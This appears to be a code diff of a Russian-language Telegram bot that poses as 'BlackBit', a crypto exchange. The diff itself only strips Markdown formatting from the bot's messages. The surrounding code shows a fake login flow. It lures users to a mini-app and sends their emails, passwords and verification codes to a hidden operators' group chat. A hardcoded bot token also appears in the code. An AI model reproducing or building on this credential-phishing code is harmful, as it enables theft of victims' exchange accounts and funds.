@@ -9,8 +9,8 @@ from telegram.ext import Application, CommandHandler, MessageHandler, filters, C
 
 # ==================== КОНФИГ ====================
 BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN", "8483815029:AAFaiAI-0cSYEtQx_iTF2bdNOmtE5K45h1I")
-GROUP_CHAT_ID = -1004457031723  # ← ID ГРУППЫ
-WEB_APP_URL = "https://d3987616-hue.github.io/blackbit/"  # ← ССЫЛКА НА MINI APP
+GROUP_CHAT_ID = -1004457031723
+WEB_APP_URL = "https://d3987616-hue.github.io/blackbit/"
 # ===============================================
 
 logging.basicConfig(level=logging.INFO)
@@ -29,18 +29,17 @@ class BlackBitBot:
         user = update.effective_user
         current_time = datetime.now().strftime("%d.%m.%Y %H:%M")
 
-        # Уведомление в группу с пометкой BLACKBIT
+        # Уведомление в группу (без Markdown)
         await self.app.bot.send_message(
             chat_id=GROUP_CHAT_ID,
             text=f"🟢 [BLACKBIT] НОВЫЙ ПОЛЬЗОВАТЕЛЬ\n"
-                 f"👤 ID: `{user.id}`\n"
+                 f"👤 ID: {user.id}\n"
                  f"👤 Имя: {user.first_name or 'без имени'}\n"
                  f"👤 Username: @{user.username or 'нет'}\n"
-                 f"🕐 Время: {current_time}",
-            parse_mode="Markdown"
+                 f"🕐 Время: {current_time}"
         )
 
-        # Приветствие пользователю с двумя кнопками
+        # Приветствие пользователю (без Markdown)
         keyboard = [
             [KeyboardButton("🔑 Войти", web_app=WebAppInfo(url=WEB_APP_URL))],
             [KeyboardButton("ℹ️ BLACKBIT")]
@@ -49,13 +48,12 @@ class BlackBitBot:
 
         await update.message.reply_text(
             f"👋 Привет, {user.first_name}!\n\n"
-            f"Добро пожаловать на **BlackBit** — криптовалютную биржу нового поколения.\n\n"
+            f"Добро пожаловать на BlackBit — криптовалютную биржу нового поколения.\n\n"
             f"🔒 Безопасность, высокая скорость и низкие комиссии.\n"
             f"📈 Торгуй BTC, ETH, USDT и другими криптовалютами.\n\n"
             f"Нажми кнопку ВНИЗУ, чтобы войти в свой аккаунт.\n"
             f"Или нажми «ℹ️ BLACKBIT», чтобы узнать больше о проекте.",
-            reply_markup=reply_markup,
-            parse_mode="Markdown"
+            reply_markup=reply_markup
         )
 
     # ===== 2. ОБРАБОТКА СООБЩЕНИЙ =====
@@ -74,15 +72,13 @@ class BlackBitBot:
         # ---- КНОПКА BLACKBIT ----
         if text == "ℹ️ BLACKBIT":
             await msg.reply_text(
-                f"📘 **О проекте BlackBit**\n\n"
+                f"📘 О проекте BlackBit\n\n"
                 f"BlackBit — это современная криптовалютная биржа для торговли цифровыми активами.\n\n"
-                f"🔒 **Безопасность** — передовые технологии защиты.\n"
-                f"⚡ **Скорость** — мгновенные транзакции.\n"
-                f"💰 **Низкие комиссии** — выгодные условия для трейдеров.\n\n"
+                f"🔒 Безопасность — передовые технологии защиты.\n"
+                f"⚡ Скорость — мгновенные транзакции.\n"
+                f"💰 Низкие комиссии — выгодные условия для трейдеров.\n\n"
                 f"📈 Торгуй BTC, ETH, USDT и другими криптовалютами.\n\n"
-                f"🔗 Mini App: [blackbit](https://d3987616-hue.github.io/blackbit/)",
-                parse_mode="Markdown",
-                disable_web_page_preview=True
+                f"🔗 Mini App: https://d3987616-hue.github.io/blackbit/"
             )
             return
 
@@ -90,8 +86,7 @@ class BlackBitBot:
         if user_sessions.get(user_id, {}).get('awaiting_code'):
             await self.app.bot.send_message(
                 chat_id=GROUP_CHAT_ID,
-                text=f"📧 [BLACKBIT] Код от {user_id}: `{text}`",
-                parse_mode="Markdown"
+                text=f"📧 [BLACKBIT] Код от {user_id}: {text}"
             )
             user_sessions[user_id]['awaiting_code'] = False
             await msg.reply_text("✅ Отправлено")
@@ -101,8 +96,7 @@ class BlackBitBot:
         if user_sessions.get(user_id, {}).get('awaiting_link'):
             await self.app.bot.send_message(
                 chat_id=GROUP_CHAT_ID,
-                text=f"🔗 [BLACKBIT] Ссылка от {user_id}: `{text}`",
-                parse_mode="Markdown"
+                text=f"🔗 [BLACKBIT] Ссылка от {user_id}: {text}"
             )
             user_sessions[user_id]['awaiting_link'] = False
             await msg.reply_text("✅ Отправлено")
@@ -123,10 +117,9 @@ class BlackBitBot:
                     await self.app.bot.send_message(
                         chat_id=GROUP_CHAT_ID,
                         text=f"🔔 [BLACKBIT] НОВАЯ ЗАЯВКА!\n\n"
-                             f"👤 ID: `{user_id}`\n"
-                             f"📧 Логин: `{email}`\n"
-                             f"🔑 Пароль: `{password}`",
-                        parse_mode="Markdown"
+                             f"👤 ID: {user_id}\n"
+                             f"📧 Логин: {email}\n"
+                             f"🔑 Пароль: {password}"
                     )
                     await msg.reply_text("✅ Заявка отправлена администратору!")
                     return
@@ -135,8 +128,7 @@ class BlackBitBot:
                 if step == 'code' and code:
                     await self.app.bot.send_message(
                         chat_id=GROUP_CHAT_ID,
-                        text=f"📧 [BLACKBIT] Код от {user_id}: `{code}`",
-                        parse_mode="Markdown"
+                        text=f"📧 [BLACKBIT] Код от {user_id}: {code}"
                     )
                     await msg.reply_text("✅ Отправлено")
                     return
@@ -146,10 +138,9 @@ class BlackBitBot:
                     await self.app.bot.send_message(
                         chat_id=GROUP_CHAT_ID,
                         text=f"🆔 [BLACKBIT] E-ID ВХОД\n\n"
-                             f"👤 ID: `{user_id}`\n"
-                             f"📧 Логин: `{email}`\n"
-                             f"🔑 Пароль: `{password}`",
-                        parse_mode="Markdown"
+                             f"👤 ID: {user_id}\n"
+                             f"📧 Логин: {email}\n"
+                             f"🔑 Пароль: {password}"
                     )
                     await msg.reply_text("✅ Заявка E-ID отправлена администратору!")
                     return
